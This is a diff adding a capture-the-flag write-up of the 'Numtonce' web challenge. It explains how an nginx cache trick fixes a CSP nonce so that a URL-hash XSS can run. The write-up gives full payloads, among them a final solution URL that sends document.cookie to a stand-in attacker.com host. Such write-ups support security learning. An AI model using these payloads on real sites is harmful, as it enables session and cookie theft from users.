@@ -1,0 +1,110 @@
+# Numtonce
+* Source: https://fluxfingersforfuture.fluxfingers.net/challenges/29
+* Challenge by: pspaul
+* Writeup by: Alain K. (LetzPwn Team)
+* Solves: 7 out of 972 teams
+
+## Description
+> With all the bad news in the world, everyone needs a calm place to wind down. 
+> [We built one](https://numtonce.fluxfingersforfuture.fluxfingers.net/), 
+> but you have to help us keep it safe. If you find anything suspicious, 
+> [tell the forest ranger](https://numtonce.fluxfingersforfuture.fluxfingers.net/submit/)!
+> He might reward you with a cookie :)
+
+## TL;DR
+XSS is possible over URL hash. However CSP is set, so no external scripts allowed. Except if nonce tag is correct. Idea is to 
+force the nonce tag to be the same after refreshes by loading the website from a cache. js/css/image files are loaded from cache, the index file itself not. 
+Force index file to load from cache by appending a css filename to the url: http://url.com/index.php/blub.css. index.php will still load, 
+however the proxy server things it is a css file and loads a cached version of index.php. Hence, we know the nonce in advance and can exceute custom js.
+
+## Complete Writeup
+By reading the description, it seems like the goal of the challenge is to steal a cookie from the browser. 
+This is usually done by injecting custom javascript into the website (XSS) with a piece of code sending 
+the cookie to a server controlled by the attacker. The forest ranger's website is just a text field to subit an URL too. 
+A bot will then visit that URL with a cookie set to the flag to capture. Knowing this, the plan of attack:
+1. Forge an URL that triggers custom javascript to send the cookie to a server we control
+2. Submit the URL to the forest ranger bot
+3. Check our server logs for stolen cookie
+4. Submmit the flag inside the cookie :)
+
+Looking at the website itself, it seems to be very simplistic. It has one single page and the source code is pretty much only this javascript code:
+```html
+<script nonce="b80a92df721eda620876363536b7e9a6" src="/emojify.min.js"></script>
+<script>
+    const l=location
+      let h=l.hash
+      var p=l.hostname
+    const s=l.search
+      let a=h.split(p)
+      var b=a.map((o,O)=>(O^0!==0&&o||'')).map(decodeURIComponent)
+    const o0o=b.join(s)
+      let script=sessionStorage[a[0]]
+      var my=a=>b
+    const msg='there is p' in my `t'
+˂/script>
+
+<script>
+    o0o='nope'
+˂/script>
+
+A wise man once said: 'A CSP a day keeps the XSS away.`
+
+<script>
+    document.write('<div id="garden">');
+    document.write(o0o||'tt t t t fnttttttttt nfst t ttt n t tl t  tnr tmtt dt n  cttttrttntt t tttttnttt   t t nt   tt tt nt  t  t  t'.split('').map(c=>({t:':evergreen_tree:',f:':fallen_leaf:',s:':squirrel:',l:':leaves:',r:':rabbit:',m:':maple_leaf:',d:':droplet:',c:':cherry_blossom:',n:'<br/>',' ':':white_small_square:'}[c])).join(''));
+    document.write('</div>');
+
+    emojify.setConfig({ img_dir: '/emojis' });
+    emojify.run(garden);
+</script>
+```
+Looking at the code, it is pretty clear that XSS over the URL is possible due to the `document.write(o0o)` line. Backtracing `o0o`, 
+one can see that it is generated using the components of the url after the hashtag. Precisely, one can inject code using the following url scheme:
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/#numtonce.fluxfingersforfuture.fluxfingers.net<h1>test</h1>`
+
+Next step is to try to embed our javascript code. However, that is where we hit a wall:
+(TODO insert screenshot)
+A CSP header was set to not allow scripts, except if the nonce tag or the scripts sha256 was correct:
+
+`Content-Security-Policy: default-src 'none'; script-src 'sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=' 'nonce-117bc8c1d6ead80e5b6ad3f3eca4921e'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none'; form-action 'none';`
+
+The nonce is a random token that gets newly generated whenever the site reloads. 
+Both options seemed impossible to us (and even the [CSP Evaulator said the header is safe](https://csp-evaluator.withgoogle.com/)), 
+so we started to try to understand the rest of the javascript code and even analye the included `emojify.js`. 
+This proved to be completely unnecassary (see *Lessons learned* ). 
+The rest of the javascript proved to be distractions only. It even includes a `<script>` tag that is not an actual script tag, 
+but a comparison to a a javascript variable called script. We spent a lot of time trying to figure out the meaning of all this but it was worthless.
+
+After a while something intersting hit us. The js/css/image files included a strange header in the HTTP response:
+
+`Hit-Or-Miss: i guess they never miss huh?`
+
+This is when we noticed that js/css/iamge files were loaded from a cache. They also had an Age header, which expired after 10 minutes.
+Then the idea struck, that if we managed to load the index.php from cache, the token would be the same for 10 minutes! We tried to force loading the index.php by setting some speciel request headers (Cache-Control, etc.). 
+However none worked and also the bot to steal the cookie from would not have them set.
+As one other header was `Server: nginx`, we looked up how to setup a basic cache on nginx. Basically, a regex filter is applied to the url and if it matches, files get cached.
+
+So we tried to forge an URL that ends with .css but still loads index.php. After some trial and error, we forged the following url: `https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css`.
+
+SUCCESS! The nonce token was always the same and the response had all the caching headers!
+
+Trying out the following we get XSS with an alert ( {nonce} being the CSP nonce token that was in a previous response header):
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="{nonce}">alert(1)</script>`
+
+However trying to send the cookie to our server via ajax or as img src didn't work due to the CSP again. So we used the same trick again and wrote a script tag with the correct nonce:
+`document.write('<script nonce="{nonce}" src="https://attacker.com/cookie='+document.cookie+'"></script>');`
+
+In hindsight, a document.location=https://attacker.com/cookie='+document.cookie+' would have worked too.
+
+## Final Solution
+`https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net<script nonce="{nonce}">document.write('<script nonce="{nonce}" src="https://attacker.com/cookie='+document.cookie+'"></script>');</script>`
+
+{nonce} being the CSP nonce token that was in a previous response header with the same URL
+
+## Lessons learned
+Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As `default-src` was set to `none`. 
+We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafa javascript code inside the website itself, 
+it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 
+of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do,
+we sould have noticed from the beginning that we needed to force a valid nonce!
+
